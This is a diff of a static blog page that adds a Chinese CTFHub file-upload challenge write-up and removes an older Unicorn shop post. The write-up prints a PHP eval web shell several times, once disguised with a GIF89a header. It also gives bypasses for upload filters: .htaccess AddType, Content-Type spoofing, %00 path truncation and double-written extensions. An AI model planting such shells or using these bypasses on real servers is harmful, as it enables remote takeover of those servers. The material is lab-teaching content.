@@ -465,6 +465,211 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88ctfhub%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="花间一壶酒">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/03/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88ctfhub%EF%BC%89/" itemprop="url">文件上传（ctfhub）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-20T22:17:45+08:00">
+                2021-03-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p><img src="https://img-blog.csdnimg.cn/20210304223615577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>上传一句话木马。<br>1.php</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[<span class="string">&#x27;1&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210304224525410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>连接蚁剑。<br><img src="https://img-blog.csdnimg.cn/20210304224627831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p><img src="https://img-blog.csdnimg.cn/20210304224807273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>可以使用浏览器的编辑功能，将页面中的submit事件删除，这样前端就不会对上传的文件后缀名进行检测，就能达到绕过的目的。</p>
+<p><img src="https://img-blog.csdnimg.cn/2021032111454438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210321114857254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传一句话木马。<br>1.php</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[<span class="string">&#x27;1&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>将文件扩展名改为.jpg</p>
+<p>抓包，把之前改的php文件改回来。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321115109609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>连接蚁剑，<br><img src="https://img-blog.csdnimg.cn/20210321115759126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者</p>
+<p>禁用Javascrip。<br>题中对文件的检测依靠于JavaScript的使用，禁用浏览器的JavaScript，可以直接让其过滤效果失效。<br>以火狐浏览器为例，地址栏输入about:config，点击回车键，找到如图的地方，点击右边按钮禁用JavaScript。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321120136390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321120239692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>通过提示我们可以通过上传.htaccess文件更改文件的扩展名，这样我们上传的txt文件就可以被按照php的方式解析。</p>
+<p>.htaccess文件里面写AddType application/x-httpd-php .jpg这串代码的意思是将txt文件解析为PHP文件执行。</p>
+<p>上传.htaccess文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>![在这里插入图片描述](<a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20210321120755861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70">https://img-blog.csdnimg.cn/20210321120755861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70</a></p>
+<p>先上传一句话木马，文件扩展名为.jpg</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321120320133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>蚁剑连接，找到flag<br><img src="https://img-blog.csdnimg.cn/20210321121130476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014028392/article/details/81624882?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161568332416780261912841%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161568332416780261912841&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-81624882.pc_search_result_no_baidu_js&utm_term=mime%E5%8D%8F%E8%AE%AE">https://blog.csdn.net/u014028392/article/details/81624882?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161568332416780261912841%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161568332416780261912841&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduend~default-2-81624882.pc_search_result_no_baidu_js&amp;utm_term=mime%E5%8D%8F%E8%AE%AE</a></p>
+<p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321121321548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要实现MIME绕过，就可以用burosuit抓包。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321121341750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先上传一句话木马，文件扩展名为.jpg<br><img src="https://img-blog.csdnimg.cn/20210321121704128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>抓包，修改扩展名为.php<br><img src="https://img-blog.csdnimg.cn/20210321122514895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注意，常见MIME类型有</span><br><span class="line">image/jpeg</span><br><span class="line">image/png</span><br><span class="line">image/gif</span><br><span class="line">把Content-Type:改成上面的<span class="number">3</span>种类型中的一个这样就不会被文件格式卡住了。</span><br></pre></td></tr></table></figure>
+
+<p>连接蚁剑<br><img src="https://img-blog.csdnimg.cn/20210321124420651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26090065/article/details/81458937?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161568505416780274120793%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161568505416780274120793&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81458937.pc_search_result_no_baidu_js&utm_term=00%E6%88%AA%E6%96%AD">00截断原理分析</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20210321170509490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传扩展名为..jpg的一句话木马。<br><img src="https://img-blog.csdnimg.cn/2021032117061194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>抓包，修改文件扩展名为.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321170902387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>文件类型不匹配，发现白名单</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321171019497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $info = pathinfo($name);</span><br><span class="line">    $ext = $info[&#x27;extension&#x27;];</span><br><span class="line">    $whitelist = <span class="built_in">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (in_array($ext, $whitelist)) &#123;</span><br><span class="line">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;文件类型不匹配&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>前面是利用文件名后缀对jpg,png,gif进行筛选的白名单。用 .php.jpg化.为00的方式绕过前缀名检查，结果发现不行。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span><br><span class="line">      if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) </span><br></pre></td></tr></table></figure>
+<p>是将我们上传的文件重命名并存储在某个路径下，完整的路径是 GET[‘road’]+随机数+日期加前面获得的后缀名。这里的随机数和时间我们无从知晓，唯一能控制的后缀名还被限制了。 这样的情况下唯一的解决思路其实就在于$_GET[‘road’]这里。</p>
+<p>可以发现在上传图片的时候还会同时用GET方式上传一个GET变量用于生成文件路径。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们在这里的road参数后利用00进行截断，那后面的时间，随机数，后缀名就全部失效，我们自己设置的路径就是$des的值，也就成了上传的文件存储的完整路径。</p>
+<p>把GET方式传递的参数改为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">road=/var/www/html/upload/<span class="number">1.</span>php%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>这个文件就成功存在了/var/www/html/upload/xiaoma.php路径下。<br>url上的截断符号为<code>%00</code></p>
+<p>filename始终还是1.jpg</p>
+<p>利用蚁剑用相对路径成功连接。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321171855861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接蚁剑，<br><img src="https://img-blog.csdnimg.cn/2021032117201321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>找到flag。<br><img src="https://img-blog.csdnimg.cn/20210321172052243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h2><p><img src="https://img-blog.csdnimg.cn/20210321172556125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>上传一句话木马文件1.php，<br><img src="https://img-blog.csdnimg.cn/20210321172531183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功，但发现文件扩展名php被过滤了，按题目提示双写，1.pphphp过滤了php就是1.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321173728877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>连接蚁剑</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321174114697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>本题黑名单：<br><img src="https://img-blog.csdnimg.cn/20210321174155455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p><img src="https://img-blog.csdnimg.cn/20210321174353839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查看源码<br><img src="https://img-blog.csdnimg.cn/20210321174417397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在一句话木马前添加文件头，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a &lt;?<span class="function">php <span class="title">eval</span><span class="params">($_POST[<span class="string">&#x27;1&#x27;</span>])</span></span>; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>将其以.jpg扩展名上传</p>
+<p><img src="https://img-blog.csdnimg.cn/20210321174759858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>抓包，<br><img src="https://img-blog.csdnimg.cn/20210321174856125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接蚁剑，<br><img src="https://img-blog.csdnimg.cn/2021032117505994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/19/20210319/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1831,155 +2036,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/09/20210309/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="花间一壶酒">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/03/09/20210309/" itemprop="url">（ASIS 2019）Unicorn shop</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-09T22:17:45+08:00">
-                2021-03-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="https://img-blog.csdnimg.cn/20210314110820649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>尝试购买最贵的独角兽：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210314110925232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>只允许输入一个字符，题目叫Unicorn，去<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">compart</a>搜索选择Numeric Value大于1337的字符：<br><img src="https://img-blog.csdnimg.cn/20210314111611924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210314111757661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/20210314111817323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>或</strong></p>
-<p>输入</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line">万 </span><br></pre></td></tr></table></figure>
-<p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210314111503281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2030,7 +2086,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-count">53</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2052,7 +2108,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">75</span>
+                  <span class="site-state-item-count">76</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
